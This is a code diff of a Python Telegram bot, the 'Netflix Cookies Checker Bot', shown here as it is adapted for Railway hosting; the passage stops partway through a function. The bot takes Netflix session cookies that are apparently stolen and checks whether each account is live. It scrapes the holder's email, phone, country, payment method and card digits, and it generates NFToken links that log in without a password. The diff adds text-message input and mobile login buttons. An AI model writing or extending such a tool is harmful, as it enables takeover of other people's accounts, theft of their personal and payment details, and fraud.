@@ -1,4 +1,4 @@
-# netflix_bot.py - النسخة النهائية (مع فلترة أسماء البروفايلات)
+# bot.py - نسخة Railway
 import os
 import re
 import json
@@ -17,11 +17,12 @@ from urllib3.exceptions import InsecureRequestWarning
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
-# ======================== توكن البوت ========================
-# قراءة التوكن من متغيرات البيئة فقط (لأمان الرفع على Railway)
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
+# ======================== توكن البوت من البيئة ========================
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+
 if not BOT_TOKEN:
-    raise ValueError("❌ BOT_TOKEN environment variable is not set! Please add it in Railway Variables.")
+    print("❌ ERROR: BOT_TOKEN not found! Please add it in Railway environment variables.")
+    exit(1)
 
 # ======================== الإعدادات ========================
 REQUEST_TIMEOUT = 30
@@ -96,10 +97,20 @@ def create_nftoken_link(netflix_id):
                 pass
             
             if token:
-                return f"https://netflix.com/?nftoken={token}"
+                return token
         return None
     except Exception:
         return None
+
+def create_pc_link(token):
+    if not token:
+        return None
+    return f"https://netflix.com/?nftoken={token}"
+
+def create_mobile_link(token):
+    if not token:
+        return None
+    return f"https://netflix.com/unsupported?nftoken={token}"
 
 # ======================== دوال الفحص ========================
 def decode_value(value):
@@ -192,16 +203,59 @@ def format_membership_status(status):
     else:
         return status.title()
 
+def extract_cookies_from_netscape(content):
+    cookies = {}
+    lines = content.split('\n')
+    
+    for line in lines:
+        line = line.strip()
+        if not line or line.startswith('#'):
+            continue
+        
+        parts = line.split('\t')
+        if len(parts) >= 7:
+            name = parts[5]
+            value = parts[6]
+            
+            if name == 'NetflixId':
+                cookies['NetflixId'] = value
+            elif name == 'SecureNetflixId':
+                cookies['SecureNetflixId'] = value
+    
+    return cookies if cookies.get('NetflixId') else None
+
+def extract_cookies_from_simple_format(content):
+    cookies = {}
+    
+    nf_match = re.search(r'NetflixId[=\s]+([^\s\n\t;]+)', content)
+    if nf_match:
+        cookies["NetflixId"] = nf_match.group(1).strip('"')
+    
+    snf_match = re.search(r'SecureNetflixId[=\s]+([^\s\n\t;]+)', content)
+    if snf_match:
+        cookies["SecureNetflixId"] = snf_match.group(1).strip('"')
+    
+    return cookies if cookies.get('NetflixId') else None
+
 def extract_all_cookies_from_file(content):
     accounts = []
-    parts = re.split(r'(?=NetflixId[=\t])', content)
     
+    netscape_cookies = extract_cookies_from_netscape(content)
+    if netscape_cookies and netscape_cookies.get("NetflixId"):
+        accounts.append({"cookies": netscape_cookies, "raw": content[:200]})
+        return accounts
+    
+    simple_cookies = extract_cookies_from_simple_format(content)
+    if simple_cookies and simple_cookies.get("NetflixId"):
+        accounts.append({"cookies": simple_cookies, "raw": content[:200]})
+        return accounts
+    
+    parts = re.split(r'(?=NetflixId[=\t])', content)
     for part in parts:
         if not part.strip():
             continue
         
         cookies = {}
-        
         nf_match = re.search(r'NetflixId[=\t]+([^\s\n\t;]+)', part)
         if nf_match:
             cookies["NetflixId"] = nf_match.group(1).strip('"')
@@ -211,32 +265,26 @@ def extract_all_cookies_from_file(content):
             cookies["SecureNetflixId"] = snf_match.group(1).strip('"')
         
         if cookies.get("NetflixId"):
-            accounts.append({"cookies": cookies, "raw": part})
+            accounts.append({"cookies": cookies, "raw": part[:200]})
     
     return accounts
 
 # ======================== دوال استخراج طريقة الدفع ========================
 def extract_payment_method(html_content):
-    """
-    استخراج طريقة الدفع من صفحة Netflix بطرق متعددة ومحسنة
-    """
     payment_methods = []
     
-    # الطريقة 1: البحث المباشر عن paymentMethod في JSON
     payment_match = re.search(r'"paymentMethod"\s*:\s*"([^"]+)"', html_content)
     if payment_match:
         method = decode_value(payment_match.group(1))
         if method and method not in payment_methods:
             payment_methods.append(method)
     
-    # الطريقة 2: البحث عن paymentMethodType
     payment_match = re.search(r'"paymentMethodType"\s*:\s*"([^"]+)"', html_content)
     if payment_match:
         method = decode_value(payment_match.group(1))
         if method and method not in payment_methods:
             payment_methods.append(method)
     
-    # الطريقة 3: البحث عن billing method في HTML
     billing_patterns = [
         r'<span[^>]*class="[^"]*payment[^"]*"[^>]*>([^<]+)</span>',
         r'<div[^>]*class="[^"]*payment-method[^"]*"[^>]*>([^<]+)</div>',
@@ -262,7 +310,6 @@ def extract_payment_method(html_content):
                         method = f"Card ending in {card_match.group(1)}"
                 payment_methods.append(method[:50])
     
-    # الطريقة 4: البحث عن payment_info في JavaScript objects
     js_patterns = [
         r'paymentMethodDisplayName["\']?\s*:\s*["\']([^"\']+)',
         r'payment_info["\']?\s*:\s*{[^}]*method["\']?\s*:\s*["\']([^"\']+)',
@@ -277,7 +324,6 @@ def extract_payment_method(html_content):
             if method and method not in payment_methods and len(method) < 100:
                 payment_methods.append(method)
     
-    # الطريقة 5: البحث عن نصوص مباشرة لطرق الدفع المعروفة
     known_methods = ['PayPal', 'Visa', 'Mastercard', 'American Express', 'Amex', 'Discover', 
                      'Gift Card', 'Mobile', 'Direct Debit', 'Prepaid', 'iTunes', 'Google Play',
                      'Bank Transfer', 'Sofort', 'IDEAL', 'Giropay']
@@ -287,7 +333,6 @@ def extract_payment_method(html_content):
             if method not in payment_methods:
                 payment_methods.append(method)
     
-    # الطريقة 6: البحث عن آخر 4 أرقام فقط
     last_four_match = re.search(r'(\d{4})[^\d]*$', html_content)
     if last_four_match and not payment_methods:
         payment_methods.append(f"Card ending in {last_four_match.group(1)}")
@@ -298,14 +343,10 @@ def extract_payment_method(html_content):
     
     return None
 
-# ======================== دوال استخراج البروفايلات (من صفحة ManageProfiles مع فلترة) ========================
+# ======================== دوال استخراج البروفايلات ========================
 def extract_all_profiles_from_manage(session, headers):
-    """
-    جلب جميع البروفايلات من صفحة ManageProfiles مع فلترة الأسماء الغير مرغوب فيها
-    """
     profiles = []
     
-    # الكلمات الممنوعة التي تظهر للبروفايلات الوهمية أو خيار الإضافة
     forbidden_names = [
         'add profile', 'add', 'اضافة', 'إضافة', 'اضافة بروفايل', 'إضافة بروفايل',
         'new profile', 'create profile', 'اضف بروفايل', 'add new', 'addnew',
@@ -314,7 +355,6 @@ def extract_all_profiles_from_manage(session, headers):
     ]
     
     try:
-        # جلب صفحة إدارة البروفايلات
         resp = session.get("https://www.netflix.com/ManageProfiles", headers=headers, timeout=REQUEST_TIMEOUT)
         
         if resp.status_code != 200:
@@ -322,7 +362,6 @@ def extract_all_profiles_from_manage(session, headers):
         
         html_content = resp.text
         
-        # الطريقة 1: البحث عن مصفوفة profiles في JSON
         profiles_match = re.search(r'"profiles"\s*:\s*\[(.*?)\](?=\s*[,\}])', html_content, re.DOTALL)
         if profiles_match:
             profiles_data = profiles_match.group(1)
@@ -335,7 +374,6 @@ def extract_all_profiles_from_manage(session, headers):
                     if not is_forbidden and decoded not in profiles and len(decoded) >= 1:
                         profiles.append(decoded)
         
-        # الطريقة 2: البحث عن profileName
         profile_matches = re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html_content)
         for match in profile_matches:
             pname = decode_value(match.group(1))
@@ -345,7 +383,6 @@ def extract_all_profiles_from_manage(session, headers):
                 if not is_forbidden and pname not in profiles and len(pname) >= 1:
                     profiles.append(pname)
         
-        # الطريقة 3: البحث في HTML عن أسماء البروفايلات
         profile_classes = [
             r'<span[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</span>',
             r'<div[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</div>',
@@ -365,29 +402,6 @@ def extract_all_profiles_from_manage(session, headers):
                     if not is_forbidden and pname not in profiles and len(pname) >= 1:
                         profiles.append(pname)
         
-        # الطريقة 4: البحث عن name داخل objects
-        name_matches = re.finditer(r'"name"\s*:\s*"([^"]+)"\s*,\s*"profileType"', html_content)
-        for match in name_matches:
-            pname = decode_value(match.group(1))
-            if pname:
-                name_lower = pname.lower().strip()
-                is_forbidden = any(forbidden in name_lower for forbidden in forbidden_names)
-                if not is_forbidden and pname not in profiles and len(pname) >= 1:
-                    profiles.append(pname)
-        
-        # الطريقة 5: البحث عن عناصر الـ select (profile switcher) مع فلترة
-        select_match = re.search(r'<select[^>]*id="[^"]*profile[^"]*"[^>]*>(.*?)</select>', html_content, re.DOTALL | re.IGNORECASE)
-        if select_match:
-            options = re.findall(r'<option[^>]*>(.*?)</option>', select_match.group(1))
-            for opt in options:
-                pname = decode_value(opt)
-                if pname:
-                    name_lower = pname.lower().strip()
-                    is_forbidden = any(forbidden in name_lower for forbidden in forbidden_names)
-                    if not is_forbidden and pname not in profiles and len(pname) >= 1:
-                        profiles.append(pname)
-        
-        # إزالة التكرارات والفلترة النهائية
         profiles = list(dict.fromkeys(profiles))
         profiles = [p for p in profiles if p and len(p) >= 1 and p.lower() not in forbidden_names]
         
@@ -426,7 +440,6 @@ def get_account_info(cookies):
             
             info = {}
             
-            # الاسم
             name_match = re.search(r'"firstName"\s*:\s*"([^"]+)"', html_content)
             if name_match:
                 info["name"] = decode_value(name_match.group(1))
@@ -435,48 +448,38 @@ def get_account_info(cookies):
                 if name_match:
                     info["name"] = decode_value(name_match.group(1))
             
-            # الإيميل - 4 طرق محسنة
             email = None
-            
             email_match = re.search(r'"email"\s*:\s*"([^"]+)"', html_content)
             if email_match:
                 email = decode_value(email_match.group(1))
-            
             if not email:
                 email_match = re.search(r'"loginId"\s*:\s*"([^"]+)"', html_content)
                 if email_match:
                     email = decode_value(email_match.group(1))
-            
             if not email:
                 email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html_content)
                 if email_match:
                     email = decode_value(email_match.group(1))
-            
             if not email:
                 email_match = re.search(r'<span[^>]*class="[^"]*email[^"]*"[^>]*>([^<]+)</span>', html_content, re.IGNORECASE)
                 if email_match:
                     email = decode_value(email_match.group(1))
-            
             info["email"] = email
             
-            # الدولة
             country_match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', html_content)
             if not country_match:
                 country_match = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', html_content)
             if country_match:
                 info["country"] = decode_value(country_match.group(1))
             
-            # اللغة
             lang_match = re.search(r'"language"\s*:\s*"([^"]+)"', html_content)
             if lang_match:
                 info["language"] = decode_value(lang_match.group(1))
             
-            # تاريخ الاشتراك
             member_match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', html_content)
             if member_match:
                 info["memberSince"] = decode_value(member_match.group(1))
             
-            # تاريخ الانتهاء
             billing_match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', html_content)
             if billing_match:
                 info["nextBilling"] = decode_value(billing_match.group(1))
@@ -485,7 +488,6 @@ def get_account_info(cookies):
                 if billing_match:
                     info["nextBilling"] = decode_value(billing_match.group(1))
             
-            # طريقة الدفع
             payment_method = extract_payment_method(html_content)
             if payment_method:
                 info["payment"] = payment_method
@@ -494,34 +496,27 @@ def get_account_info(cookies):
                 if payment_match:
                     info["payment"] = decode_value(payment_match.group(1))
             
-            # الهاتف
             phone_match = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html_content)
             if phone_match:
                 info["phone"] = decode_value(phone_match.group(1))
             
-            # حالة الهاتف
             phone_verified_match = re.search(r'"phoneVerified"\s*:\s*(true|false)', html_content, re.IGNORECASE)
             if phone_verified_match:
                 info["phone_verified"] = "Verified" if phone_verified_match.group(1).lower() == "true" else "Not Verified"
             
-            # عدد الشاشات
             streams_match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', html_content)
             if streams_match:
                 info["streams"] = streams_match.group(1)
             
-            # حالة التعليق
             hold_match = re.search(r'"holdStatus"\s*:\s*(true|false)', html_content, re.IGNORECASE)
             info["hold"] = "Yes" if hold_match and hold_match.group(1).lower() == "true" else "No"
             
-            # Extra Member
             extra_match = re.search(r'"showExtraMemberSection"\s*:\s*(true|false)', html_content, re.IGNORECASE)
             info["extra_member"] = "Yes" if extra_match and extra_match.group(1).lower() == "true" else "No"
             
-            # التحقق من الإيميل
             email_verified_match = re.search(r'"emailVerified"\s*:\s*(true|false)', html_content, re.IGNORECASE)
             info["email_verified"] = "Yes" if email_verified_match and email_verified_match.group(1).lower() == "true" else "No"
             
-            # حالة العضوية
             status_match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html_content)
             if status_match:
                 raw_status = decode_value(status_match.group(1))
@@ -529,19 +524,16 @@ def get_account_info(cookies):
             else:
                 info["status"] = "Active"
             
-            # الخطة
             plan_match = re.search(r'"planName"\s*:\s*"([^"]+)"', html_content)
             if not plan_match:
                 plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', html_content)
             if plan_match:
                 info["plan"] = decode_value(plan_match.group(1))
             
-            # الجودة
             quality_match = re.search(r'"videoQuality"\s*:\s*"([^"]+)"', html_content)
             if quality_match:
                 info["quality"] = decode_value(quality_match.group(1))
             
-            # ========== البروفايلات - من صفحة ManageProfiles مع فلترة ==========
             profiles = extract_all_profiles_from_manage(session, headers)
             
             if profiles:
@@ -608,7 +600,103 @@ def determine_plan(info):
     
     return "unknown", "Unknown", True
 
-def format_account_details(info, nftoken_link=None):
+# ======================== دالة تنسيق النتيجة للشات ========================
+def format_account_details_for_chat(info, pc_link=None, mobile_link=None):
+    if not info:
+        return None, None
+    
+    plan_key, plan_display, is_paid = determine_plan(info)
+    
+    if not is_paid:
+        return None, None
+    
+    lines = []
+    
+    if plan_key == "premium":
+        lines.append("🌟 PREMIUM ACCOUNT 🌟")
+    elif plan_key == "standard":
+        lines.append("📺 STANDARD ACCOUNT 📺")
+    elif plan_key == "basic":
+        lines.append("🔰 BASIC ACCOUNT 🔰")
+    elif plan_key == "mobile":
+        lines.append("📱 MOBILE ACCOUNT 📱")
+    else:
+        lines.append("🎬 NETFLIX ACCOUNT 🎬")
+    
+    lines.append("")
+    lines.append("✅ Status: Valid Paid Account")
+    lines.append("")
+    lines.append("👤 Account Details:")
+    lines.append("")
+    
+    lines.append(f"   👤 Name: {info.get('name', 'Unknown')}")
+    
+    email = info.get('email')
+    if email and email != 'Unknown' and email != 'None':
+        lines.append(f"   📧 Email: {email}")
+    
+    country = info.get('country', 'Unknown')
+    flag = country_to_flag(country)
+    lines.append(f"   🌍 Country: {country} {flag}")
+    
+    lines.append(f"   📦 Plan: {plan_display}")
+    
+    member_since = info.get('memberSince')
+    if member_since:
+        formatted = format_member_since(member_since)
+        if formatted and formatted != 'Unknown':
+            lines.append(f"   📅 Member Since: {formatted}")
+    
+    next_billing = info.get('nextBilling')
+    if next_billing:
+        formatted_billing = format_date(next_billing)
+        if formatted_billing and formatted_billing != 'Unknown':
+            lines.append(f"   ⏰ Next Billing: {formatted_billing}")
+    
+    if info.get('payment'):
+        lines.append(f"   💳 Payment: {info.get('payment')}")
+    
+    if info.get('phone'):
+        phone_verified = info.get('phone_verified', '')
+        check = "✅" if phone_verified == "Verified" else "❌"
+        lines.append(f"   📱 Phone: {info.get('phone')} ({check})")
+    
+    if info.get('streams'):
+        lines.append(f"   📺 Streams: {info.get('streams')}")
+    
+    lines.append(f"   ⏸️ Hold: {info.get('hold', 'No')}")
+    lines.append(f"   👥 Extra Member: {info.get('extra_member', 'No')}")
+    lines.append(f"   ✅ Email Verified: {info.get('email_verified', 'No')}")
+    lines.append(f"   🛡️ Status: {info.get('status', 'Active')}")
+    
+    lines.append("")
+    lines.append("👥 Profiles:")
+    lines.append("")
+    
+    if info.get('profiles_count') and info.get('profiles_count') > 0:
+        lines.append(f"   👥 Total: {info.get('profiles_count')}")
+        profiles_list = info.get('profiles_list', 'Unknown')
+        if len(profiles_list) > 50:
+            profiles_list = profiles_list[:47] + "..."
+        lines.append(f"   📝 List: {profiles_list}")
+    else:
+        lines.append("   No profiles found")
+    
+    text = "\n".join(lines)
+    
+    keyboard = None
+    if pc_link and mobile_link:
+        keyboard = InlineKeyboardMarkup([
+            [
+                InlineKeyboardButton("💻 PC Login", url=pc_link),
+                InlineKeyboardButton("📱 Mobile Login", url=mobile_link)
+            ]
+        ])
+    
+    return text, keyboard
+
+# ======================== دالة تنسيق النتيجة للملفات ========================
+def format_account_details_for_file(info, pc_link=None):
     if not info:
         return None
     
@@ -673,11 +761,11 @@ def format_account_details(info, nftoken_link=None):
     else:
         details.append("No profiles found")
     
-    if nftoken_link:
+    if pc_link:
         details.append("")
         details.append("NFTOKEN LOGIN LINKS")
         details.append("-" * 40)
-        details.append(f"PC Login:\n{nftoken_link}")
+        details.append(f"PC Login:\n{pc_link}")
     else:
         details.append("")
         details.append("NFTOKEN LOGIN LINKS")
@@ -712,7 +800,7 @@ async def update_progress(context):
     invalid = sum(1 for r in results.values() if r.get("plan_key") == "invalid")
     
     text = (
-        f"🔄 **Processing Started**\n\n"
+        f"🔄 Processing Started\n\n"
         f"📁 Total Cookies: {total_accounts}\n"
         f"⚙️ Mode: Fullinfo\n"
         f"🔧 Threads: 25 parallel\n\n"
@@ -723,12 +811,12 @@ async def update_progress(context):
         f"   ├─ 🔰 Basic: {basic}\n"
         f"   ├─ 📱 Mobile: {mobile}\n"
         f"   └─ ❌ Invalid: {invalid}\n\n"
-        f"`{bar}` `{percent}%`\n\n"
+        f"{bar} {percent}%\n\n"
         f"⚠️ Use /cancel to stop this task"
     )
     
     try:
-        await context.bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown")
+        await context.bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id)
     except:
         pass
 
@@ -737,53 +825,65 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     name = user.first_name or "User"
     
     text = (
-        f"🎬 **Netflix Cookies Checker Bot**\n"
+        f"🎬 Netflix Cookies Checker Bot\n"
         f"👨‍💻 Developer: Eyad 🐼\n\n"
         f"✨ Welcome {name}! ✨\n\n"
-        f"**📌 WHAT I DO:**\n"
+        f"📌 WHAT I DO:\n"
         f"   ├─ Verify Netflix cookies\n"
         f"   └─ Extract premium account details\n\n"
-        f"**📖 HOW TO USE:**\n"
+        f"📖 HOW TO USE:\n"
         f"   1️⃣ Export cookies (.txt or .json)\n"
         f"   2️⃣ Send files directly (single or ZIP)\n"
-        f"   3️⃣ Watch progress bar\n"
-        f"   4️⃣ Receive files by Plan with NFToken links\n\n"
-        f"**⚙️ COMMANDS:**\n"
+        f"   3️⃣ OR send cookies as text message 📝\n"
+        f"   4️⃣ Watch progress bar\n"
+        f"   5️⃣ Receive results with PC & Mobile buttons\n\n"
+        f"✅ Supported Cookie Formats:\n"
+        f"   ├─ Netscape format (*.txt files)\n"
+        f"   ├─ Simple format (NetflixId=value)\n"
+        f"   ├─ JSON format\n"
+        f"   └─ ZIP archives\n\n"
+        f"⚙️ COMMANDS:\n"
         f"   ├─ /start → Show menu\n"
         f"   ├─ /help → Instructions\n"
         f"   ├─ /stats → Statistics\n"
         f"   └─ /cancel → Stop task\n\n"
-        f"📁 **Send your cookies file to start checking**"
+        f"📁 Send cookies file or paste cookies text to start"
     )
     
-    await update.message.reply_text(text, parse_mode="Markdown")
+    await update.message.reply_text(text)
 
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
-        f"📖 **HOW TO USE:**\n\n"
-        f"1️⃣ Export Netflix cookies using browser extension\n"
-        f"2️⃣ Save as .txt format\n"
-        f"3️⃣ Send file directly to bot\n"
-        f"4️⃣ Bot will automatically extract all accounts\n"
-        f"5️⃣ Results will be sent as text files with NFToken links\n\n"
-        f"**📁 Supported formats:**\n"
+        f"📖 HOW TO USE:\n\n"
+        f"طريقة 1 - إرسال ملف:\n"
+        f"   1️⃣ Export Netflix cookies using browser extension\n"
+        f"   2️⃣ Save as .txt format\n"
+        f"   3️⃣ Send file directly to bot\n\n"
+        f"طريقة 2 - إرسال نص:\n"
+        f"   1️⃣ انسخ الكوكيز بأي شكل\n"
+        f"   2️⃣ الصق النص في الشات وأرسله\n"
+        f"   3️⃣ البوت سيتعرف عليه تلقائياً\n\n"
+        f"📁 Supported formats:\n"
         f"   ├─ .txt (Netscape format)\n"
         f"   ├─ .json (JSON format)\n"
-        f"   └─ .zip (Archive)\n\n"
-        f"**⚙️ Commands:**\n"
+        f"   ├─ .zip (Archive)\n"
+        f"   └─ Direct text message ✨\n\n"
+        f"⚙️ Commands:\n"
         f"   ├─ /start - Main menu\n"
         f"   ├─ /help - This help\n"
         f"   ├─ /stats - Statistics\n"
         f"   └─ /cancel - Stop current task\n\n"
-        f"**🔑 NFToken Info:**\n"
+        f"🔑 NFToken Info:\n"
         f"   The NFToken link allows direct login to Netflix\n"
         f"   without password. It expires after approximately 1 hour."
     )
-    await update.message.reply_text(text, parse_mode="Markdown")
+    await update.message.reply_text(text)
 
 async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global total_accounts, results
+    
     if total_accounts == 0:
-        await update.message.reply_text("📭 No statistics available.\nSend me some cookies files first!", parse_mode="Markdown")
+        await update.message.reply_text("📭 No statistics available.\nSend me some cookies files first!")
         return
     
     premium = sum(1 for r in results.values() if r.get("plan_key") == "premium")
@@ -794,7 +894,7 @@ async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     valid = premium + standard + basic + mobile
     
     text = (
-        f"📊 **Statistics:**\n\n"
+        f"📊 Statistics:\n\n"
         f"📁 Total Accounts: {total_accounts}\n"
         f"✅ Valid Paid Accounts: {valid}\n"
         f"   ├─ 💎 Premium: {premium}\n"
@@ -803,33 +903,23 @@ async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"   └─ 📱 Mobile: {mobile}\n"
         f"❌ Invalid/Free: {invalid}"
     )
-    await update.message.reply_text(text, parse_mode="Markdown")
+    await update.message.reply_text(text)
 
 async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global checking, stop_flag
     if checking:
         stop_flag = True
         checking = False
-        await update.message.reply_text("🛑 Task cancelled by user.", parse_mode="Markdown")
+        await update.message.reply_text("🛑 Task cancelled by user.")
     else:
-        await update.message.reply_text("⚠️ No active task to cancel.", parse_mode="Markdown")
+        await update.message.reply_text("⚠️ No active task to cancel.")
 
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if query.data == "start_check":
-        await query.message.reply_text("📁 Send me your cookies files (.txt, .json, or .zip)\n\nI will check them automatically!", parse_mode="Markdown")
-    elif query.data == "stats":
-        await stats_cmd(update, context)
-    elif query.data == "help":
-        await help_cmd(update, context)
-
+# ======================== معالجة الملفات ========================
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global checking, results, total_accounts, processed, chat_id, msg_id, stop_flag
     
     if checking:
-        await update.message.reply_text("⚠️ A scan is already running!\nPlease wait or use /cancel to stop.", parse_mode="Markdown")
+        await update.message.reply_text("⚠️ A scan is already running!\nPlease wait or use /cancel to stop.")
         return
     
     doc = update.message.document
@@ -840,10 +930,10 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ext = os.path.splitext(filename)[1].lower()
     
     if ext not in [".txt", ".json", ".zip"]:
-        await update.message.reply_text(f"❌ Unsupported format: `{ext}`\n\nSupported: .txt , .json , .zip", parse_mode="Markdown")
+        await update.message.reply_text(f"❌ Unsupported format: {ext}\n\nSupported: .txt , .json , .zip")
         return
     
-    await update.message.reply_text(f"📥 Received: `{filename}`\n\n🔄 Extracting accounts...", parse_mode="Markdown")
+    await update.message.reply_text(f"📥 Received: {filename}\n\n🔄 Extracting accounts...")
     
     file = await context.bot.get_file(doc.file_id)
     file_bytes = await file.download_as_bytearray()
@@ -862,7 +952,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                 acc["source"] = name
                                 all_accounts.append(acc)
         except:
-            await update.message.reply_text("❌ Failed to extract ZIP file", parse_mode="Markdown")
+            await update.message.reply_text("❌ Failed to extract ZIP file")
             return
     else:
         content = file_bytes.decode("utf-8", errors="ignore")
@@ -872,11 +962,11 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             all_accounts.append(acc)
     
     if not all_accounts:
-        await update.message.reply_text("❌ No valid cookies found in file!", parse_mode="Markdown")
+        await update.message.reply_text("❌ No valid cookies found in file!")
         return
     
     total_accounts = len(all_accounts)
-    await update.message.reply_text(f"✅ Found `{total_accounts}` accounts in file\n\n🚀 Starting scan...", parse_mode="Markdown")
+    await update.message.reply_text(f"✅ Found {total_accounts} accounts in file\n\n🚀 Starting scan...")
     
     checking = True
     stop_flag = False
@@ -885,7 +975,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     start_time = time.time()
     
-    msg = await context.bot.send_message(chat_id, "🔄 Processing Started...", parse_mode="Markdown")
+    msg = await context.bot.send_message(chat_id, "🔄 Processing Started...")
     msg_id = msg.message_id
     
     for idx, account in enumerate(all_accounts):
@@ -912,11 +1002,13 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         plan_key, plan_display, is_paid = determine_plan(info)
         
-        nftoken_link = None
+        pc_link = None
         if is_paid and netflix_id:
-            nftoken_link = create_nftoken_link(netflix_id)
+            token = create_nftoken_link(netflix_id)
+            if token:
+                pc_link = create_pc_link(token)
         
-        details = format_account_details(info, nftoken_link)
+        details = format_account_details_for_file(info, pc_link)
         
         results[f"{source}_acc_{idx+1}"] = {
             "plan_key": plan_key,
@@ -924,7 +1016,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "details": details,
         }
         
-        time.sleep(0.05)  # كما هو بدون تغيير
+        time.sleep(0.05)
     
     checking = False
     
@@ -943,8 +1035,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     speed = valid / elapsed if elapsed > 0 else 0
     
     result_text = (
-        f"✅ **Processing Complete**\n\n"
-        f"📊 **Final Statistics:**\n"
+        f"✅ Processing Complete\n\n"
+        f"📊 Final Statistics:\n"
         f"   ├─ Total Accounts Scanned: {total_accounts}\n"
         f"   ├─ Valid Paid Accounts: {valid}\n"
         f"   ├─ 💎 Premium: {premium}\n"
@@ -956,7 +1048,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"   └─ Speed: {speed:.2f} accounts/second"
     )
     
-    await context.bot.send_message(chat_id, result_text, parse_mode="Markdown")
+    await context.bot.send_message(chat_id, result_text)
     
     plan_files = {
         "premium": "PREMIUM_ACCOUNTS.txt",
@@ -987,7 +1079,138 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             print(f"[ERROR] Failed to send {out_filename}: {e}")
     
     if valid == 0:
-        await context.bot.send_message(chat_id, "⚠️ No valid paid accounts found in the file!", parse_mode="Markdown")
+        await context.bot.send_message(chat_id, "⚠️ No valid paid accounts found in the file!")
+
+# ======================== معالجة النص المباشر ========================
+async def handle_text_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global checking, results, total_accounts, processed, chat_id, msg_id, stop_flag
+
+    if checking:
+        await update.message.reply_text("⚠️ A scan is already running!\nPlease wait or use /cancel to stop.")
+        return
+
+    text = update.message.text.strip()
+    
+    if text.startswith('/'):
+        return
+
+    if 'NetflixId' not in text:
+        return
+
+    await update.message.reply_text("🔍 Detected cookies in your message!\n\n🔄 Extracting accounts from text...")
+
+    all_accounts = extract_all_cookies_from_file(text)
+
+    if not all_accounts:
+        await update.message.reply_text("❌ No valid cookies found in your message!")
+        return
+
+    total_accounts = len(all_accounts)
+    await update.message.reply_text(f"✅ Found {total_accounts} account(s) in your message\n\n🚀 Starting scan...")
+
+    checking = True
+    stop_flag = False
+    results = {}
+    processed = 0
+    chat_id = update.effective_chat.id
+    start_time = time.time()
+
+    msg = await context.bot.send_message(chat_id, "🔄 Processing cookies...")
+    msg_id = msg.message_id
+
+    for idx, account in enumerate(all_accounts):
+        if stop_flag:
+            break
+
+        processed = idx + 1
+        await update_progress(context)
+
+        cookies = account["cookies"]
+        source = "text_message"
+
+        netflix_id = cookies.get("NetflixId")
+
+        info, error = get_account_info(cookies)
+
+        if error or not info:
+            results[f"{source}_acc_{idx+1}"] = {
+                "plan_key": "invalid",
+                "plan": "Invalid",
+                "details": f"❌ Error: {error or 'Unknown'}",
+                "pc_link": None,
+                "mobile_link": None,
+            }
+            continue
+
+        plan_key, plan_display, is_paid = determine_plan(info)
+
+        pc_link = None
+        mobile_link = None
+        if is_paid and netflix_id:
+            token = create_nftoken_link(netflix_id)
+            if token:
+                pc_link = create_pc_link(token)
+                mobile_link = create_mobile_link(token)
+
+        details, keyboard = format_account_details_for_chat(info, pc_link, mobile_link)
+
+        results[f"{source}_acc_{idx+1}"] = {
+            "plan_key": plan_key,
+            "plan": plan_display,
+            "details": details,
+            "keyboard": keyboard,
+        }
+
+        time.sleep(0.05)
+
+    checking = False
+
+    try:
+        await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
+    except:
+        pass
+
+    elapsed = time.time() - start_time
+    premium = sum(1 for r in results.values() if r.get("plan_key") == "premium")
+    standard = sum(1 for r in results.values() if r.get("plan_key") in ["standard", "standard_with_ads"])
+    basic = sum(1 for r in results.values() if r.get("plan_key") == "basic")
+    mobile = sum(1 for r in results.values() if r.get("plan_key") == "mobile")
+    invalid = sum(1 for r in results.values() if r.get("plan_key") == "invalid")
+    valid = premium + standard + basic + mobile
+    speed = valid / elapsed if elapsed > 0 else 0
+
+    result_text = (
+        f"✅ Processing Complete\n\n"
+        f"📊 Final Statistics:\n"
+        f"   ├─ Total Accounts Scanned: {total_accounts}\n"
+        f"   ├─ Valid Paid Accounts: {valid}\n"
+        f"   ├─ 💎 Premium: {premium}\n"
+        f"   ├─ 📺 Standard: {standard}\n"
+        f"   ├─ 🔰 Basic: {basic}\n"
+        f"   ├─ 📱 Mobile: {mobile}\n"
+        f"   └─ ❌ Invalid/Free: {invalid}\n"
